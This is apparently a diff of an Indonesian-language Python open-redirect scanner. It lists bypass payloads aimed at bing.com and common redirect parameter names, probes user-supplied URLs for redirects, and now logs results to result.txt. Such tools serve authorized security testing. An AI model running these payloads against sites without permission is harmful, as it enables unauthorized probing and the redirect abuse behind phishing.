@@ -1,7 +1,7 @@
 import requests
 import urllib.parse
 
-# ASCII BANNER
+# === ASCII BANNER ===
 print(r"""
  ______   .______    _______ .__   __. .______       _______  _______   __  .______       _______   ______ .___________.
 /  __  \  |   _  \  |   ____||  \ |  | |   _  \     |   ____||       \ |  | |   _  \     |   ____| /      ||           |
@@ -12,7 +12,7 @@ print(r"""
                                                                                                                       
 """)
 
-# Payload bypass Open Redirect
+# === PAYLOAD BYPASS ===
 bypass_payloads = [
     "https://bing.com",
     "//bing.com",
@@ -30,7 +30,7 @@ bypass_payloads = [
     "%0Dbing.com"
 ]
 
-# Parameter redirect yang umum digunakan
+# === PARAMETER REDIRECT ===
 redirect_params = [
     "url", "redirect", "next", "target", "link", "rurl", "dest", "destination",
     "image_url", "go", "success", "logout", "login", "clickurl", "forward_url",
@@ -41,7 +41,7 @@ redirect_params = [
     "next_url"
 ]
 
-# Fungsi untuk validasi URL
+# === VALIDASI URL ===
 def is_valid_url(url):
     try:
         parsed = urllib.parse.urlparse(url)
@@ -49,62 +49,67 @@ def is_valid_url(url):
     except:
         return False
 
-# Fungsi untuk menguji Open Redirect
-def test_open_redirect(base_url):
+# === LOG KE FILE ===
+def log_result(text, file_handle):
+    print(text)
+    file_handle.write(text + "\n")
+
+# === TEST OPEN REDIRECT ===
+def test_open_redirect(base_url, file_handle):
     if not is_valid_url(base_url):
-        print(f"[⚠️] URL tidak valid: {base_url}")
+        log_result(f"[⚠️] URL tidak valid: {base_url}", file_handle)
         return
 
     vulnerable = False
 
     for param in redirect_params:
         for payload in bypass_payloads:
-            encoded_payload = urllib.parse.quote(payload, safe='')  # Encode payload
+            encoded_payload = urllib.parse.quote(payload, safe='')
             test_url = f"{base_url}?{param}={encoded_payload}"
-            
+
             try:
                 response = requests.get(test_url, allow_redirects=False)
                 if response.status_code in [301, 302, 303, 307, 308]:
                     location = response.headers.get("Location", "")
                     parsed_location = urllib.parse.urlparse(location)
 
-                    # Cek apakah redirect benar-benar ke bing.com
                     if parsed_location.netloc.lower() == "bing.com" or parsed_location.netloc.lower().endswith(".bing.com"):
-                        print(f"[✅] {test_url} -> {location} [Status: {response.status_code}]")
+                        log_result(f"[✅] {test_url} -> {location} [Status: {response.status_code}]", file_handle)
                         vulnerable = True
-                        return  # Stop di URL pertama yang rentan
+                        return
             except requests.RequestException as e:
-                print(f"[⚠️] Gagal mengakses: {test_url} ({e})")
+                log_result(f"[⚠️] Gagal mengakses: {test_url} ({e})", file_handle)
 
     if not vulnerable:
-        print(f"[❌] Tidak ditemukan Open Redirect pada: {base_url}")
+        log_result(f"[❌] Tidak ditemukan Open Redirect pada: {base_url}", file_handle)
 
-# Fungsi untuk membaca banyak URL dari file .txt
-def test_from_file(file_path):
+# === BACA DARI FILE .TXT ===
+def test_from_file(file_path, file_handle):
     try:
         with open(file_path, "r") as file:
             urls = file.read().splitlines()
             for url in urls:
-                test_open_redirect(url)
+                test_open_redirect(url, file_handle)
     except FileNotFoundError:
-        print("[⚠️] File tidak ditemukan!")
+        log_result("[⚠️] File tidak ditemukan!", file_handle)
 
-# Menu utama
+# === MAIN MENU ===
 def main():
     print("🔍 Open Redirect Scanner 🔍")
     print("[1] Uji satu URL")
     print("[2] Uji banyak URL dari file .txt")
-    
+
     choice = input("Pilih mode (1/2): ")
-    
-    if choice == "1":
-        url = input("Masukkan URL target: ")
-        test_open_redirect(url)
-    elif choice == "2":
-        file_path = input("Masukkan path file .txt: ")
-        test_from_file(file_path)
-    else:
-        print("Pilihan tidak valid!")
+
+    with open("result.txt", "w") as file_handle:
+        if choice == "1":
+            url = input("Masukkan URL target: ")
+            test_open_redirect(url, file_handle)
+        elif choice == "2":
+            file_path = input("Masukkan path file .txt: ")
+            test_from_file(file_path, file_handle)
+        else:
+            print("Pilihan tidak valid!")
 
 if __name__ == "__main__":
     main()
